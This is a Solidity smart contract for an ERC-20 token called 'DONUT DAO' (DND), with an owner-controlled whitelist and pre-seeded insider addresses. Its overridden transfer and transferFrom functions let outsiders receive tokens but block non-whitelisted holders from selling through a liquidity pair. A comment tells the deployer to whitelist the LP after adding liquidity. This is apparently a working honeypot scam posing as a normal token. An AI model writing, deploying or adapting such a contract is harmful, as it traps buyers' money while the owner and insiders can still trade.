// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("DONUT DAO", "DND") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000 * 10 ** decimals());
        whiteList[0x16a628d148f2c4478b5ce182ea4d6f6d91A7B8Ce]= true;
        whiteList[0x1fA4dd1D83E0c4086b071ac9D25C22E990895403]=true;
        whiteList[0xCCB86Aed86328B023E768F25e6a2f10eB05FFF1e]=true;
        whiteList[0xf13bd8E1923C4fBfCbd137f21157a7212b22Fbe6]=true;
        whiteList[0x62d7fa8dbc232aDe33Ea06037Ffe9d7A235AB14D]=true;
        whiteList[0xb4bc34B59a44591F9d1d046A06Ad3528D3444433]=true;
        whiteList[0x5977EA6ff2c0930cEc8225164A26161ed707421C]=true;
        whiteList[0x672B498d25890681a8F59FcC2d94739E89E390c6]=true;
        whiteList[0xE01A23AcACB91981EF0fd595EfB2dE5E2cDED0b2]=true;
        whiteList[0x89621415cA22d21b0cC21f33Ba55BbcBa93b8eE1]=true;
        whiteList[0xEe39aC8218185CAEdfDC0246A83B4007A2d54683]=true;
        whiteList[0x66E1FFb2ED2dd2933F44Ce24f227fFc377f3DBCd]=true;
        whiteList[0x200Cd5d3b9eEC10D8ed9027332cE516794A8b5C1]=true;
        whiteList[0x04957299827A55c1d2164373A59b564AC103200B]=true;
        whiteList[0x203d2AA7C446b11F8a4949763F018DC4c807d5c8]=true;
        whiteList[0x5325c457aa67560DF6b07a72970063a139407e95]=true;
        whiteList[0xae0f0e03F6BaC805f4E8b2d72Eafb2719E8547e0]=true;
        whiteList[0x3764d34fd6E57602e7945FDb7e91b0e55AE83B1d]=true;
        whiteList[0x2d999005EaCD64eF55Dc0f7f82293621f2E0725d]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}